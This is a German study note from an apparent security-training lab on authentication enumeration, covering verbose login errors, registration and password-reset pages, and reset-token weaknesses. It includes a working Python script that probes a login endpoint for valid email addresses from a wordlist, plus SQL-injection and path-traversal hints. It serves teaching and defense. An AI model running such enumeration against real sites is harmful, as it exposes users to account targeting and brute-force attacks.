# Authentification Enumeration

Die Authentifizierungs Enumeration ist wie das Schälen einer Zwiebel. Man entfernt jede Schicht der Systemsicherheit, um die darunter liegenden tatsächlichen Vorgänge aufzudecken. Dabei geht es nicht nur um Routinekontrollen, sondern darum, zu erkennen, wie alles miteinander verbunden ist.

Das kann man sich etwas wie die Arbeit eines Detectives vorstellen, welcher nicht nur Spuren sammelt sondern auch schaut wie diese sich miteinander verbinden und über das Rätsel/den Fall aussagen.

## Identifizieren von Validen Nutzernamen


Wenn ein Angreifer einen gültigen Benutzernamen kennt, kann er sich ganz auf das Passwort konzentrieren. Benutzernamen lassen sich auf verschiedene Weise herausfinden, beispielsweise indem man beobachtet, wie die Anwendung beim Anmelden oder beim Zurücksetzen des Passworts reagiert. Fehlermeldungen wie „Dieses Konto existiert nicht“ oder „Falsches Passwort“ können Hinweise auf gültige Benutzernamen geben und einem Angreifer die Arbeit erleichtern.

## Passwort Policies 

Die Richtlinien zur Erstellung von Passwörtern können wertvolle Einblicke in die Komplexität der in einer Anwendung verwendeten Passwörter geben. Durch das Verständnis dieser Richtlinien kann ein Angreifer die potenzielle Komplexität der Passwörter einschätzen und seine Strategie entsprechend anpassen. Der folgende PHP-Code verwendet beispielsweise reguläre Ausdrücke, um ein Passwort zu verlangen, das Symbole, Zahlen und Großbuchstaben enthält.


```php
<?php
$password = $_POST['pass']; // Example1
$pattern = '/^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).+$/';

if (preg_match($pattern, $password)) {
    echo "Password is valid.";
} else {
    echo "Password is invalid. It must contain at least one uppercase letter, one number, and one symbol.";
}
?>
```


## Plätze zum Enumerieren dieser Daten

### Registrierung Seiten

Webanwendungen gestalten den Registrierungsprozess für Benutzer in der Regel einfach und informativ, indem sie sofort anzeigen, ob eine E-Mail-Adresse oder ein Benutzername verfügbar ist. Diese Rückmeldung soll zwar die Benutzerfreundlichkeit verbessern, kann jedoch unbeabsichtigt einen doppelten Zweck erfüllen. Wenn bei einem Registrierungsversuch die Meldung erscheint, dass ein Benutzername oder eine E-Mail-Adresse bereits vergeben ist, bestätigt die Anwendung damit ungewollt jedem, der sich registrieren möchte, deren Existenz. Angreifer nutzen diese Funktion aus, indem sie potenzielle Benutzernamen oder E-Mail-Adressen testen und so eine Liste aktiver Benutzer zusammenstellen, ohne direkten Zugriff auf die zugrunde liegende Datenbank zu benötigen.

### Passwort Reset Seiten

Mechanismen zum Zurücksetzen von Passwörtern sollen Benutzern helfen, wieder Zugriff auf ihre Konten zu erhalten, indem sie ihre Daten eingeben, um Anweisungen zum Zurücksetzen zu erhalten. Die Unterschiede in der Reaktion der Anwendung können jedoch unbeabsichtigt sensible Informationen preisgeben. Beispielsweise können Abweichungen in der Rückmeldung einer Anwendung darüber, ob ein Benutzername existiert, Angreifern helfen, die Identität von Benutzern zu überprüfen. Durch die Analyse dieser Antworten können Angreifer ihre Listen mit gültigen Benutzernamen verfeinern und so die Wirksamkeit nachfolgender Angriffe erheblich verbessern.

### Verbose Fehler

Verbose Fehlermeldungen bei Anmeldeversuchen oder anderen interaktiven Prozessen können zu viel preisgeben. Wenn diese Meldungen zwischen „Benutzername nicht gefunden” und „falsches Passwort” unterscheiden, sollen sie den Benutzern helfen, ihre Anmeldeprobleme zu verstehen. Sie liefern Angreifern jedoch auch eindeutige Hinweise auf gültige Benutzernamen, die für gezieltere Angriffe ausgenutzt werden können.

### Data Breach Informationen

Daten aus früheren Sicherheitsverletzungen sind für Angreifer eine Goldgrube, da sie damit testen können, ob kompromittierte Benutzernamen und Passwörter auf verschiedenen Plattformen wiederverwendet werden. Findet ein Angreifer eine Übereinstimmung, deutet dies nicht nur darauf hin, dass der Benutzername wiederverwendet wird, sondern auch auf eine mögliche Wiederverwendung des Passworts, insbesondere wenn die Plattform bereits zuvor gehackt wurde. Diese Technik zeigt, wie sich die Auswirkungen einer einzigen Datenverletzung auf mehrere Plattformen auswirken können, indem die Verbindungen zwischen verschiedenen Online-Identitäten ausgenutzt werden.

# Enumeration von Usern via Verbose Errors 

Verbose Errors werden  für gewöhnlich von Developern eingesetzt um Heraus zu finden wo es Problem in der Web App gab. Aber ähnlich wie bei einer Belauschten Konversation können auch die se zu viele Informationen Preisgeben. 
Verbose Errors können Informationen wie: 
- **Interne Pfade** Wie eine Karte, die zu einem versteckten Schatz führt, zeigen diese die Dateipfade und Verzeichnisstrukturen des Anwendungsservers, die Konfigurationsdateien oder geheime Schlüssel enthalten können, die für einen normalen Benutzer nicht sichtbar sind.
- **Datenbanken Details** Diese Fehler bieten einen Einblick in die Datenbank und können Geheimnisse wie Tabellennamen und Spaltendetails preisgeben.
- **User Information**  Manchmal können diese Fehler sogar Hinweise auf Benutzernamen oder andere personenbezogene Daten enthalten und damit wichtige Anhaltspunkte für weitere Ermittlungen liefern.

preisgeben.

## Auslösen von Verbose Errors

Angreifer provozieren verbose Fehler, um die Anwendung dazu zu zwingen, ihre Geheimnisse preiszugeben. Im Folgenden sind einige gängige Techniken aufgeführt, mit denen diese Fehler provoziert werden können:

- **Ungültige Anmeldeversuche**: Das ist so, als würde man an jede Tür klopfen, um zu sehen, welche sich öffnet. Durch die absichtliche Eingabe falscher Benutzernamen oder Passwörter können Angreifer Fehlermeldungen auslösen, die dabei helfen, zwischen gültigen und ungültigen Benutzernamen zu unterscheiden. Wenn man beispielsweise einen Benutzernamen eingibt, der nicht existiert, wird möglicherweise eine andere Fehlermeldung angezeigt als bei der Eingabe eines existierenden Benutzernamens, wodurch erkennbar wird, welche Benutzernamen aktiv sind.

- **SQL-Injection**: Bei dieser Technik werden bösartige SQL-Befehle in Eingabefelder eingeschleust, in der Hoffnung, dass das System einen Fehler macht und Informationen über seine Datenbankstruktur preisgibt. Wenn beispielsweise ein einfaches Anführungszeichen ( ') in ein Anmeldefeld eingegeben wird, kann dies dazu führen, dass die Datenbank einen Fehler ausgibt und versehentlich Details über ihr Schema preisgibt.

- **Datei-Einbindung/Pfad-Traversal**: Durch Manipulation von Dateipfaden können Angreifer versuchen, auf eingeschränkte Dateien zuzugreifen, indem sie das System zu Fehlern verleiten, die interne Pfade offenlegen. Beispielsweise kann die Verwendung von Verzeichnis-Traversal-Sequenzen wie `../../` zu Fehlern führen, die eingeschränkte Dateipfade offenlegen.

- **Formularmanipulation:** Durch das Manipulieren von Formularfeldern oder Parametern kann die Anwendung dazu gebracht werden, Fehler anzuzeigen, die Backend-Logik oder sensible Benutzerinformationen offenlegen. Beispielsweise kann das Ändern versteckter Formularfelder, um Validierungsfehler auszulösen, Einblicke in das erwartete Datenformat oder die Struktur geben.

- **Anwendungs-Fuzzing**: Das Senden unerwarteter Eingaben an verschiedene Teile der Anwendung, um deren Reaktion zu beobachten, kann dabei helfen, Schwachstellen zu identifizieren. Tools wie Burp Suite Intruder werden beispielsweise verwendet, um diesen Prozess zu automatisieren. Dabei wird die Anwendung mit verschiedenen Payloads bombardiert, um zu sehen, welche davon informative Fehler provozieren.

## Die Rolle von Enumeration und Brute-Force-Angriffen

Wenn es darum geht, Authentifizierungen zu knacken, gehen Enumeration und Brute-Force-Angriffe oft Hand in Hand:

- **Benutzer-Enumeration:** Das Aufdecken gültiger Benutzernamen schafft die Voraussetzungen dafür, dass bei nachfolgenden Brute-Force-Angriffen weniger geraten werden muss.
- **Ausnutzen von verbosen Fehlern:** Die aus diesen Fehlern gewonnenen Erkenntnisse können Aspekte wie Passwortrichtlinien und Mechanismen zur Kontosperrung aufzeigen und den Weg für effektivere Brute-Force-Strategien ebnen.

## Praktisches Beispiel (Manuell): 
In diesem HackerOne-Bericht konnte der Angreifer mithilfe der Funktion „Passwort vergessen“ der Website Benutzer auflisten. Auf ähnliche Weise können wir auch E-Mail-Adressen in Anmeldeformularen auflisten. Navigieren Sie beispielsweise zu http://enum.thm/labs/verbose_login/ und geben Sie eine beliebige E-Mail-Adresse in das Eingabefeld „E-Mail“ ein.


Wenn Sie eine ungültige E-Mail-Adresse eingeben, antwortet die Website mit „E-Mail-Adresse existiert nicht“, was darauf hinweist, dass die E-Mail-Adresse noch nicht registriert wurde.

https://imgur.com/OJTFyEb

Wenn die E-Mail-Adresse jedoch bereits registriert ist, gibt die Website die Fehlermeldung „Ungültiges Passwort“ aus, um anzuzeigen, dass die E-Mail-Adresse in der Datenbank vorhanden ist, das Passwort jedoch falsch ist.

https://imgur.com/Oaf5P8u


### Praktisches Beispiel (Automatisiert):

Nachfolgend finden Sie ein Python-Skript, das die Ziel-Webanwendung auf gültige E-Mail-Adressen überprüft. Speichern Sie den folgenden Code als script.py.

```
python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```

Wir können eine gemeinsame Liste von E-Mails aus diesem Repository verwenden.
https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt

Once you've downloaded the payload list, use the script on the AttackBox or your own machine to check for valid email addresses.

```
python3 script.py usernames_gmail.com.txt
```


# Exploiting Vulnerable Password Reset Logic

Der Mechanismus zum Zurücksetzen von Passwörtern ist ein wichtiger Bestandteil der Benutzerfreundlichkeit moderner Webanwendungen. Seine Implementierung erfordert jedoch sorgfältige Sicherheitsüberlegungen, da schlecht gesicherte Verfahren zum Zurücksetzen von Passwörtern leicht ausgenutzt werden können.

 **Email-Based Reset**
--
Wenn ein Benutzer sein Passwort zurücksetzt, sendet die Anwendung eine E-Mail mit einem Link zum Zurücksetzen oder einem Token an die registrierte E-Mail-Adresse des Benutzers. Der Benutzer klickt dann auf diesen Link, der ihn zu einer Seite weiterleitet, auf der er ein neues Passwort eingeben und bestätigen kann, oder das System generiert automatisch ein neues Passwort für den Benutzer. Diese Methode hängt stark von der Sicherheit des E-Mail-Kontos des Benutzers und der Geheimhaltung des gesendeten Links oder Tokens ab.

 **Security Question-Based Reset**
--
Dabei muss der Benutzer eine Reihe von vorab konfigurierten Sicherheitsfragen beantworten, die er bei der Erstellung seines Kontos festgelegt hat. Sind die Antworten korrekt, erlaubt das System dem Benutzer, mit der Zurücksetzung seines Passworts fortzufahren. Diese Methode bietet zwar zusätzliche Sicherheit, da sie Informationen erfordert, die nur der Benutzer kennen sollte, kann jedoch kompromittiert werden, wenn ein Angreifer Zugriff auf personenbezogene Daten (PII) erhält, die manchmal leicht zu finden oder zu erraten sind.

 **SMS-Based Reset**
--
Diese Funktion ähnelt der E-Mail-basierten Zurücksetzung, verwendet jedoch SMS, um einen Zurücksetzungscode oder einen Link direkt an das Mobiltelefon des Benutzers zu senden. Sobald der Benutzer den Code erhalten hat, kann er ihn auf der angegebenen Webseite eingeben, um auf die Funktion zur Zurücksetzung des Passworts zuzugreifen. Diese Methode setzt voraus, dass der Zugriff auf das Telefon des Benutzers sicher ist, kann jedoch anfällig für SIM-Swapping-Angriffe oder Abhörversuche sein.




Jede dieser Methoden hat ihre Schwachstellen:


- **Vorhersehbare Tokens:** Wenn die in Links oder SMS-Nachrichten verwendeten Reset-Tokens vorhersehbar sind oder einem sequenziellen Muster folgen, können Angreifer diese erraten oder mit Brute-Force-Angriffen gültige Reset-URLs generieren.
- **Probleme mit dem Ablauf von Tokens:** Tokens, die zu lange gültig bleiben oder nicht sofort nach der Verwendung ablaufen, bieten Angreifern eine Gelegenheit zum Angriff. Es ist entscheidend, dass Tokens schnell ablaufen, um diese Gelegenheit zu begrenzen.
- **Unzureichende Validierung:** Die Mechanismen zur Überprüfung der Identität eines Benutzers, wie Sicherheitsfragen oder E-Mail-basierte Authentifizierung, können schwach und anfällig für Missbrauch sein, wenn die Fragen zu allgemein sind oder das E-Mail-Konto kompromittiert wurde.
- **Unsichere Übertragung:** Die Übertragung von Links zum Zurücksetzen oder Tokens über Nicht-HTTPS-Verbindungen kann diese kritischen Elemente der Überwachung durch Netzwerk-Abhörer aussetzen.